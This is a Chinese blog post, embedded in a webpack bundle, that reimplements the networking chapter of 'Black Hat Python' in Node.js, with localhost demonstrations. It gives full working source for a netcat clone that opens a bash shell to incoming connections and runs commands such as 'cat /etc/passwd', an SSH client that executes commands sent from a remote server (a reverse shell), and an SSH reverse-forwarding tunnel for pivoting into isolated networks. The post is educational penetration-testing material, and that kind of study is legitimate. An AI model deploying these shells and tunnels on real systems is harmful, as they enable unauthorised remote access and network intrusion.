webpackJsonp([9,192],{612:function(n,e){n.exports={rawContent:"\n这天我来到j3，看到斌哥的一本叫做blackhat python的书\n\n看看各位安全界大神们对Python的评价，我觉得。。。好多疑惑\n\n你被攻击机器没有ssh服务器，就有python解释器了？\n\n有python解释器，不还得装上paramiko么。。\n\n到底还是二进制程序最靠谱。。也许能打包吧\n\n最关键的是\n\n> 我觉得Javascript更好啊！\n\n开玩笑，不过nodejs的stream是一个强大的抽象，让我们先用nodejs来第二章网络基础中的  \nPython代码吧，体会下什么叫方便好用2333\n\n## TCP/UDP之Client/Server\n\n略过\n\n## netcatJS\n\n这是第一个大一点的练习，作者说不止一次，他进入的机器中没有netcat但是有python  \n这确实是python的优势，然而我依然要用node来写一次，既然用node就使用其他语言不  \n大有的东西，stream。\n\nPython版本的实现中，IO是阻塞的，在服务器模式时，通过线程来支持多个连接。程序大量  \n使用循环和冗杂的数据处理。程序是时间先后导向的。\n\nNodeJS的版本中，IO天生非阻塞，我依靠stream来让程序不至于直接推出，依靠stream来  \n添加提示符，写文件等等，在更高的抽象层次上更优雅实现功能。程序是事件驱动数据导向的\n\n值得一提的是，NodeJS中的stream有很多好处的，比如Python那个程序碰到100G的大文件就傻逼了。。。  \n所以更好的方式是使用Python中的[流](https://docs.python.org/2/library/io.html)\n\n```javascript\n'use strict'\nconst getopt = require('posix-getopt')\nconst net = require('net')\nconst fs = require('fs')\nconst exec = require('child_process').exec\nconst spawn = require('child_process').spawn\nconst util= require('util')\nconst Transform = require('stream').Transform\n\nlet debug = ()=>{}\n\n/*\n * global\n */\nlet listen = false\nlet command = false\nlet upload = false\nlet execute = ''\nlet target = ''\nlet uploadDestination = ''\nlet port = 0\n\nif (process.argv.length < 3) usage()\n/*\n * getopt\n */\n\nlet parser = new getopt.BasicParser(\n  'h(help)l(listen)e:(execute)t:(target)p:(port)c(command)u:(upload)', \n  process.argv\n)\n\n\nlet option\nwhile ((option = parser.getopt()) && !option.error) {\n  switch (option.option) {\n      case 'h':\n          usage()\n          process.exit(0)\n          break\n      case 'l':\n          debug('listen')\n          listen = true\n          break\n      case 'e':\n          debug('execute')\n          execute = option.optarg\n          break\n      case 't':\n          debug('target')\n          target = option.optarg\n          break\n      case 'p':\n          debug('port')\n          port = parseInt(option.optarg)\n          break\n      case 'c':\n          debug('command')\n          command = true\n          break\n      case 'u':\n          debug('upload')\n          uploadDestination = option.optarg\n          break\n      default:\n          break\n  }\n}\n\n/* \n * connect\n */\nif (!listen && target.length && port > 0) {\n  let client = net.connect({host: target, port: port}, () => {\n    debug(`connect to ${target}:${port}`)\n  })\n  process.stdin.pipe(client)\n  client.pipe(process.stdout)\n  client.on('error', (e) => {\n    console.error(e)\n    process.exit(e)\n  })\n  client.on('end', (e) => {\n    process.exit(0)\n  })\n}\n\n/*\n * listen\n */\n\nif (listen) {\n  if (!target) {\n    target = '0.0.0.0'\n  }\n  net.createServer((c) => {\n    /*\n     * upload\n     */\n    if (uploadDestination) {\n      let f = fs.createWriteStream(uploadDestination)\n      c.pipe(f)\n    }\n\n    /*\n     * execute\n     */\n    if (execute) {\n      exec(execute, (err, stdout, stderr) => {\n        c.write(stdout)\n        c.write(stderr)\n        c.end()\n      })\n    }\n\n    /*\n     * command\n     */\n    if (command) {\n      c.write('<netcatJS:#>')\n      let sh = spawn('/bin/bash', [], {\n        //detached: true,\n      })\n      let prompt = new Transform({\n        transform: function(chunk, encoding, next) {\n          this.push(chunk + '<netcatJS:#>');\n          next();\n        },\n        flush: function(done) {\n          done();\n        }\n      });\n      sh.stdout.pipe(prompt).pipe(c)\n      c.pipe(sh.stdin)\n      c.on('end', () => {\n        sh.kill()\n      })\n    }\n  })\n  .listen(port)\n  .on('error', (e) => {\n    console.error(e)\n    process.exit(1)\n  })\n}\n\n/*\n * usage\n */\nfunction usage(){\n  console.log(\n    `\n    netcatJS\n\n    Usage: netcatjs -t target_host -p port\n    -l --listen                 - listen on [host]:[port] for incoming connections\n    -e --execute=file_to_run    - execute the given file upon receiving a connection\n    -c --command                - initialize a command shell\n    -u --upload=destination     - upon receiving connection upload a file and write to [destination]\n\n    Examples:\n    netcatjs -t 192.168.0.1 -p 5555 -l -c\n    netcatjs -t 192.168.0.1 -p 5555 -l -u \"c:\\\\\\\\target.exe\"\n    netcatjs -t 192.168.0.1 -p 5555 -l -e \"cat /etc/passwd\"\n    echo 'ABCDEFGHI' | netcatjs -t 192.168.0.1 -p 135\n    `)\n  process.exit(0)\n}\n```\n\n使用\n\n```bash\n# 连接本机8000端口\n➜  netcatjs node index -t localhost -p 8000  \nhello\n╭─[~/tmp/netcatjs]─[reverland@reverland-R478-R429]─[0]─[10001]\n╰─[:)] % nc -lvp 8000\nListening on [0.0.0.0] (family 0, port 8000)\nConnection from [127.0.0.1] port 8000 [tcp/*] accepted (family 2, sport 41574)\nhello\n\n# 监听8000并为连入连接开启shell\n➜  netcatjs node index -t 127.0.0.1 -p 8000 -l -c\n╭─[~/tmp/netcatjs]─[reverland@reverland-R478-R429]─[0]─[10002]\n╰─[:)] % nc localhost 8000\n<netcatJS:#>id\nuid=1000(reverland) gid=1000(reverland) groups=1000(reverland),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare),127(wireshark)\n\n# 监听8000并将监听的输入保存到文件aFile中\n➜  netcatjs node index -t 127.0.0.1 -p 8000 -l --upload=./aFile\n╭─[~/tmp/netcatjs]─[reverland@reverland-R478-R429]─[0]─[10009]\n╰─[:)] % echo ABCDE| nc localhost 8000\n## stop server\n➜  netcatjs cat ./aFile \nABCDE\n\n# 监听8000将id命令结果传回连入连接\n➜  netcatjs node index -t 127.0.0.1 -p 8000 -l -e \"id\"\n╭─[~/tmp/netcatjs]─[reverland@reverland-R478-R429]─[0]─[10011]\n╰─[:)] % nc localhost 8000\nuid=1000(reverland) gid=1000(reverland) groups=1000(reverland),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare),127(wireshark)\n```\n\n## 一个TCP代理\n\n作者说，你经常没有wireshark用，但Python到处都是。他经常部署简单的TCP代理以了解未知  \n协议，修改发送的数据包，或者为模糊测试创建一个测试环境\n\n我个大傻逼想了想，Javascript也很适合啊，就算没有，我们用python下载下来一个Nodejs。。。\n\n本书中Python的实现，还是以事件发生先后顺序即以时间为轴进行编程，于是就看到了  \n冗杂的接受和发送过程。不是很清楚Python里stream这种东西怎样，  \n也许可以看看[eyalarubas的文章](http://eyalarubas.com/python-subproc-nonblock.html)\n\nJS版本就清爽很多，因为js程序的是围绕数据设计的，依托stream这种抽象，我们可以  \n方便的记录、修改传递数据。而不用过多关心我先把数据传给谁再传给谁的问题。而且，  \n这不到100行程序并不比Python程序功能少，而且可以少一个判断是否先接收服务器返回的参数。  \n怎么看都觉得stream是优雅的。\n\nhexdump的代码没什么难度，就是计算位置的时候我就开始撞大运编程了。。。\n\n```javascript\n'use strict'\nconst net = require('net')\nconst Transform = require('stream').Transform\nconst PassThrough = require('stream').PassThrough\n\nif (process.argv.length != 6) {\n  console.log(\n    `\n    Usage: proxyjs [localhost] [localport] [remotehost] [remoteport]\n    Example: proxyjs 127.0.0.1 9000 123.125.114.144 80\n    `\n  )\n  process.exit(0)\n}\n\nlet localHost = process.argv[2]\nlet localPort = process.argv[3]\nlet remoteHost = process.argv[4]\nlet remotePort = process.argv[5]\n\nnet.createServer((c) => {\n\n  let logReq = new PassThrough()\n  let logRes = new PassThrough()\n  logReq.on('data', recordReq)\n  logRes.on('data', recordRes)\n  let requestTransform = new Transform({\n    // 不能写成=>\n    transform: function(chunk, encoding, next) {\n      this.push(chunk)\n      next()\n    },\n    flush: function(done) {\n      done()\n    }\n  })\n\n  let responseTransform = new Transform({\n    // 不能写成=>这里有坑哈哈哈\n    transform: function(chunk, encoding, next) {\n      this.push(chunk)\n      next()\n    },\n    flush: function(done) {\n      done()\n    }\n  })\n\n  console.log(`[==>]Received incoming connection from${c.address().address}:${c.address().port}`)\n  let remote = net.connect(remotePort, remoteHost, ()=>{})\n  c.pipe(logReq)\n  .pipe(requestTransform)\n  .pipe(remote)\n  .pipe(responseTransform)\n  .pipe(logRes)\n  .pipe(c).on('error', (e)=>{\n    console.error(e)\n    remote.end()\n  })\n\n  remote.on('error', (e)=>{\n    console.error(e)\n    c.end()\n  })\n}).listen({\n  host: localHost,\n  port: localPort\n})\n\nconsole.log(`[*] Listening on ${localHost}:${localPort}`)\n\nfunction hexdump(buf) {\n  let hex = buf.toString('hex')\n  for (let i = 0; i < hex.length; i += 2) {\n    if (i % 32 == 0) {\n      // offset\n      let hexRepresent= (i / 2).toString(16)\n      let offset = hexRepresent.length < 6 ? Array(6 - hexRepresent.length).fill('0').join('') + hexRepresent: hexRepresent;\n      process.stdout.write(`${offset}\\t`)\n    }\n    process.stdout.write(`${hex.slice(i, i+2)} `)\n    if (i % 32 == 30 || i >= (hex.length - 2)) {\n      if (i >= (hex.length - 2)) {\n        // what a fuck calculating offsets here\n        process.stdout.write(Array((32 - (i % 32)) / 2 - 1).fill('   ').join(''))\n      }\n      let asciiLine = Array.from(buf.slice(i / 2 - ((i / 2) % 16), i / 2 + 1)).map( (n) => {\n        if (n > 127 || n < 33) \n          return '.'\n        else \n          return String.fromCharCode(n)\n      }).join('')\n      process.stdout.write(` ${asciiLine}\\n`)\n    }\n  }\n}\n\nfunction recordReq(chunk) {\n  console.log(`[==>] Received ${chunk.length} bytes from ${localHost}:${localPort}`)\n  hexdump(chunk)\n}\n\nfunction recordRes(chunk) {\n  console.log(`[<==] Sending ${chunk.length} bytes to ${remoteHost}:${remotePort}`)\n  hexdump(chunk)\n}\n```\n\n使用\n\n```javascript\n╭─[~/tmp/proxyjs]─[reverland@reverland-R478-R429]─[0]─[10035]\n╰─[:)] % node index.js 127.0.0.1 9000 123.125.114.144 80\n[*] Listening on 127.0.0.1:9000\n[==>]Received incoming connection from127.0.0.1:9000\n[==>] Received 15 bytes from 127.0.0.1:9000\n000000\t47 45 54 20 2f 20 48 54 54 50 2f 31 2e 30 0a     GET./.HTTP/1.0.\n[==>] Received 1 bytes from 127.0.0.1:9000\n000000\t0a                                               .\n[<==] Sending 381 bytes to 123.125.114.144:80\n000000\t48 54 54 50 2f 31 2e 31 20 32 30 30 20 4f 4b 0d  HTTP/1.1.200.OK.\n000010\t0a 44 61 74 65 3a 20 57 65 64 2c 20 30 39 20 4d  .Date:.Wed,.09.M\n000020\t61 72 20 32 30 31 36 20 30 39 3a 32 30 3a 34 37  ar.2016.09:20:47\n000030\t20 47 4d 54 0d 0a 53 65 72 76 65 72 3a 20 41 70  .GMT..Server:.Ap\n000040\t61 63 68 65 0d 0a 4c 61 73 74 2d 4d 6f 64 69 66  ache..Last-Modif\n000050\t69 65 64 3a 20 54 75 65 2c 20 31 32 20 4a 61 6e  ied:.Tue,.12.Jan\n000060\t20 32 30 31 30 20 31 33 3a 34 38 3a 30 30 20 47  .2010.13:48:00.G\n000070\t4d 54 0d 0a 45 54 61 67 3a 20 22 35 31 2d 34 37  MT..ETag:.\"51-47\n000080\t63 66 37 65 36 65 65 38 34 30 30 22 0d 0a 41 63  cf7e6ee8400\"..Ac\n000090\t63 65 70 74 2d 52 61 6e 67 65 73 3a 20 62 79 74  cept-Ranges:.byt\n0000a0\t65 73 0d 0a 43 6f 6e 74 65 6e 74 2d 4c 65 6e 67  es..Content-Leng\n0000b0\t74 68 3a 20 38 31 0d 0a 43 61 63 68 65 2d 43 6f  th:.81..Cache-Co\n0000c0\t6e 74 72 6f 6c 3a 20 6d 61 78 2d 61 67 65 3d 38  ntrol:.max-age=8\n0000d0\t36 34 30 30 0d 0a 45 78 70 69 72 65 73 3a 20 54  6400..Expires:.T\n0000e0\t68 75 2c 20 31 30 20 4d 61 72 20 32 30 31 36 20  hu,.10.Mar.2016.\n0000f0\t30 39 3a 32 30 3a 34 37 20 47 4d 54 0d 0a 43 6f  09:20:47.GMT..Co\n000100\t6e 6e 65 63 74 69 6f 6e 3a 20 43 6c 6f 73 65 0d  nnection:.Close.\n000110\t0a 43 6f 6e 74 65 6e 74 2d 54 79 70 65 3a 20 74  .Content-Type:.t\n000120\t65 78 74 2f 68 74 6d 6c 0d 0a 0d 0a 3c 68 74 6d  ext/html....<htm\n000130\t6c 3e 0a 3c 6d 65 74 61 20 68 74 74 70 2d 65 71  l>.<meta.http-eq\n000140\t75 69 76 3d 22 72 65 66 72 65 73 68 22 20 63 6f  uiv=\"refresh\".co\n000150\t6e 74 65 6e 74 3d 22 30 3b 75 72 6c 3d 68 74 74  ntent=\"0;url=htt\n000160\t70 3a 2f 2f 77 77 77 2e 62 61 69 64 75 2e 63 6f  p://www.baidu.co\n000170\t6d 2f 22 3e 0a 3c 2f 68 74 6d 6c 3e 0a           m/\">.</html>.\nreverland@reverland-R478-R429 ~/tmp/proxyjs\n  % nc localhost 9000                                                    !10036\nGET / HTTP/1.0\n\nHTTP/1.1 200 OK\nDate: Wed, 09 Mar 2016 09:20:47 GMT\nServer: Apache\nLast-Modified: Tue, 12 Jan 2010 13:48:00 GMT\nETag: \"51-47cf7e6ee8400\"\nAccept-Ranges: bytes\nContent-Length: 81\nCache-Control: max-age=86400\nExpires: Thu, 10 Mar 2016 09:20:47 GMT\nConnection: Close\nContent-Type: text/html\n\n<html>\n<meta http-equiv=\"refresh\" content=\"0;url=http://www.baidu.com/\">\n</html>\n```\n\n## 使用ssh加密连接\n\n这部分有两个重要的例子。\n\n*   一个是ssh客户端反向连接服务器端并打开一个客户端机器的shell\n*   一个是ssh转发代理.\n\n书中Python的实现使用了Paramiko库，作为对比，nodejs有ssh2。我觉得  \nNodejs提供的抽象让人远离了冗杂的数据操作,站在数据流动的角度思考问题。  \n但，也没Python那样直观和一目了然了。\n\n首先，需要生成服务器私钥，也就是host key\n\n```bash\nreverland@reverland-R478-R429 ~/tmp/sshjs\n  % ssh-keygen -t rsa                                                    !10039\nGenerating public/private rsa key pair.\nEnter file in which to save the key (/home/reverland/.ssh/id_rsa): host.key\nhost.key already exists.\nOverwrite (y/n)? y\nEnter passphrase (empty for no passphrase): \nEnter same passphrase again: \nYour identification has been saved in host.key.\nYour public key has been saved in host.key.pub.\nThe key fingerprint is:\ncc:e3:2e:65:3d:5c:58:17:2b:62:bd:9a:30:38:38:bf reverland@reverland-R478-R429\nThe key's randomart image is:\n+--[ RSA 2048]----+\n|              .. |\n|           .. .. |\n|          ooo..  |\n|     . + ....o   |\n|    o o So ..    |\n|     o oo++o     |\n|      .o. o.     |\n|      .o         |\n|      E..        |\n+-----------------+\n```\n\n这时候目录下应该还会多了一个`host.key.pub`，这是公钥\n\n首先，我们来实现sshcmd.js，客户端。客户端连接ssh服务器，  \n建立连接，  \n接收ssh服务器响应的命令并执行  \n执行结果写入连接，并附上提示符等待下一个命令\n\n```bash\n\n\t\n\n'use strict'\nconst Client = require('ssh2').Client\nconst exec = require('child_process').exec\nconst fs = require('fs')\n\nsshCommand('127.0.0.1', 2222, 'root', '123456', 'clientConnected')\n\nfunction sshCommand(ip, port, user, passwd, command) {\n  let conn = new Client()\n  conn.on('ready', () => {\n    console.log(`Connected to ${ip}:${port}`)\n    conn.exec(command, (err, stream) => {\n      if (err) throw err;\n      stream.on('close', (code, signal) =>{\n        console.log(`Disconnected from ${ip}:${port}`)\n        conn.end()\n      })\n      let cmd\n      stream.on('data', (thunk)=>{\n        cmd = thunk\n        if (cmd) {\n          let ps = exec(cmd, (error, stdout, stderr) => {\n            if (error) console.error(err);\n            stream.write(stdout)\n            stream.write(stderr)\n            stream.write('Command> ')\n          })\n        }\n      })\n    })\n  }).connect({\n    host: ip,\n    port: port,\n    username: user,\n    password: passwd,\n  })\n}\n```\n\n接着是服务器端，看看我们的server多简单，\n\n关于ssh2 的一个小细节，npm上ssh2还是0.4，createServer时还应该用privateKey而不是hostKeys，\n\n```javascript\n'use strict'\n\nconst fs = require('fs')\nconst inspect = require('util').inspect\nconst ssh2 = require('ssh2')\n\nnew ssh2.Server({\n  //hostKeys: [fs.readFileSync('host.key.pub')],\n  privateKey: fs.readFileSync('host.key').toString()\n}, function(client) {\n  let peername = client._sock._peername\n  console.log(`${peername.address}:${peername.port} connected!`)\n\n  client.on('authentication', function(ctx) {\n      ctx.accept()\n  }).on('ready', function() {\n    //console.log('Client authenticated!')\n\n    client.on('session', function(accept, reject) {\n      var session = accept()\n      session.on('exec', function(accept, reject, info) {\n        console.log(inspect(info.command))\n        var stream = accept()\n        process.stdout.write(`Command> `)\n        process.stdin.pipe(stream)\n        stream.pipe(process.stdout)\n      })\n    })\n  }).on('end', function() {\n    console.log(`${peername.address}:${peername.port} disconnected!`)\n  })\n}).listen(2222, '127.0.0.1', function() {\n  console.log('Listening on port ' + this.address().port)\n})\n```\n\n\n可以参看对比下到处while、try的Python代码，  \n虽然我没判断exit命令，但就是在`sshcmd.js`里加个判断的事\n\n使用如下\n\n```javascript\n#客户端\nreverland@reverland-R478-R429 ~/tmp/sshjs\n  % node sshcmd.js                                                       !10045\nConnected to 127.0.0.1:2222\n\n# 服务器端\n10045 ◯  node sshserver.js \nListening on port 2222\n127.0.0.1:55292 connected!\n'clientConnected'\nCommand> id   \nuid=1000(reverland) gid=1000(reverland) groups=1000(reverland),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare),127(wireshark)\nCommand> whoami\nreverland\nCommand>\n```\n\n最后实现一个ssh加密的转发反向代理`sshrforward.js`。和书中场景一样。ssh client反向连接ssh server  \n该server就把本地某个端口与ssh client连接起来，所有通过这个端口的请求  \n都经过ssh client转发给与ssh同在目标网络的web服务器。反之，所有web服务器的返回  \n经由ssh client传递给ssh server的该端口。\n\n本书中的Python实现可谓丧心病狂，除了把线程用上，还开始在python中写  \n底层的select。看上去不长，但命令行解析部分省略了，其实不短\n\n好在我们有nodejs，异步IO非阻塞。Commander用来方便解析命令行参数  \nmutableStream用来让密码不至于随着输入显示，  \n除去这些一堆花样，剩下的几行就是简单的ssh转发\n\n```javascript\n'use strict'\nconst Client = require('ssh2').Client\nconst program = require('commander')\nconst readline = require('readline')\nconst inspect = require('util').inspect\nconst Writable = require('stream').Writable\nconst net = require('net')\n\nvar mutableStdout = new Writable({\n  write: function(chunk, encoding, callback) {\n    if (!this.muted)\n      process.stdout.write(chunk, encoding)\n    callback()\n  }\n})\n\n// 把password 打印出来\nmutableStdout.muted = false\n\nconst rl = readline.createInterface({\n  input: process.stdin,\n  output: mutableStdout,\n  terminal: true\n})\n\nparseOptions()\n\nfunction parseOptions() {\n  program\n  .version('0.0.1')\n  .option('-p, --port <port>', 'server port to bind to')\n  .option('-r, --remote <host>', \"remote host to connect to\")\n  .option('-u, --username <username>', \"username\")\n  .option('-P, --password', \"password\")\n  .parse(process.argv)\n\n  if (!program.args.length) {\n    program.help()\n  }\n  let serverHost = program.args[0].split(':')[0]\n  let serverPort = program.args[0].split(':')[1] || 22\n  let bindPort = program.port\n  let remoteHost = program.remote.split(':')[0]\n  let remotePort = program.remote.split(':')[1] || 80\n  let username = program.username\n  if (program.password) {\n    rl.question('password: ', (text) => {\n      let password = text.trim()\n      var options = {\n        server: serverHost,\n        serverPort: serverPort,\n        serverBindPort: bindPort,\n        remote: remoteHost,\n        remotePort: remotePort,\n        username: username,\n        password: password,\n      }\n      sshrforward(options);\n    })\n    // 让输入的密码打印不出来，createInterface时必须terminal: true(isTTY)\n    mutableStdout.muted = true\n  }\n}\nfunction sshrforward(options) {\n  //console.log(inspect(options))\n  var conn = new Client()\n  console.log(`\\nConnecting to ssh host ${options.server}:${options.serverPort}`)\n  conn.on('ready', function() {\n    console.log(`Now forwarding remote port ${options.serverBindPort} to ${options.remote}:${options.remotePort}`)\n    conn.forwardIn(options.server, options.serverBindPort, function(err) {\n      if (err) throw err;\n      console.log(`Listening for connections on server on port ${options.serverBindPort}!`)\n    })\n  }).on('tcp connection', function(info, accept, reject) {\n    // console.dir(info)\n    let stream = accept();\n    let conn = net.connect(options.remotePort, options.remote, () => {\n      console.log(`Connected! Tunnel open ${info.srcIP}:${info.srcPort} -> ${options.server}:${options.serverBindPort} -> ${options.remote}:${options.remotePort}`)\n      stream.pipe(conn).pipe(stream).on('error', (e) => {\n        console.error(e)\n        conn.end()\n      })\n    })\n    conn.on('error', (e) => {\n      console.error(e)\n      stream.end()\n    })\n  }).connect({\n    host: options.server,\n    port: options.serverPort,\n    username: options.username,\n    password: options.password\n  })\n}\n```\n\n使用也很明了，假设sshrforward.js所在机器与百度在同一个目标网络，而ssh服务器所在的网络是隔绝的，  \n那么如将百度(180.149.132.47:80)绑定到ssh服务器8000端口，ssh服务器就可以通过8000端口经由sshrforward.js所在的机器连接百度\n\n```bash\n# sshrforward.js\nreverland@reverland-R478-R429 ~/tmp/sshjs\n  % node sshrforward.js 127.0.0.1 -p 8000 -r 180.149.132.47:80 --username=reverland --password\npassword: \nConnecting to ssh host 127.0.0.1:22\nNow forwarding remote port 8000 to 180.149.132.47:80\nListening for connections on server on port 8000!\nConnected! Tunnel open 127.0.0.1:43048 -> 127.0.0.1:8000 -> 180.149.132.47:80\n\n# 在ssh server上\nreverland-R478-R429 ॐ  ~/tmp/sshjs:\n10054 ◯  nc localhost 8000\nGET / HTTP/1.0\n\nHTTP/1.1 200 OK\nDate: Wed, 09 Mar 2016 10:05:07 GMT\nServer: Apache\nLast-Modified: Tue, 12 Jan 2010 13:48:00 GMT\nETag: \"51-47cf7e6ee8400\"\nAccept-Ranges: bytes\nContent-Length: 81\nCache-Control: max-age=86400\nExpires: Thu, 10 Mar 2016 10:05:07 GMT\nConnection: Close\nContent-Type: text/html\n\n<html>\n<meta http-equiv=\"refresh\" content=\"0;url=http://www.baidu.com/\">\n</html>\n```\n\n在两台机器上能看得更清楚，如果只有一台机器。  \n这个8000端口并不能用`lsof -i :8000`的方法看到  \n却可以通过`netstat -ltnp`来看到，查看进程开的端口`netstat -nap | pgrep \"node|ssh\"`  \n也不能看到这个端口，所以，大概和ssh的22端口一样是ssh莫名开的吧2333\n\n其他程序启动的8000端口不具有这个特性。\n\n至此，第二章完结。\n\n我想对每个渗透测试人员说，既然能用python，那为啥不能用python下载个nodejs？\n\n哈哈哈\n\n游泳去了，也许会写写接下来第三章的扫描器\n",metaData:{layout:"post",title:"Black Hat Javascript",excerpt:"netcat, tcp proxy, ssh shell in nodejs",category:"javascript",tags:["javascript","security"],disqus:!0}}}});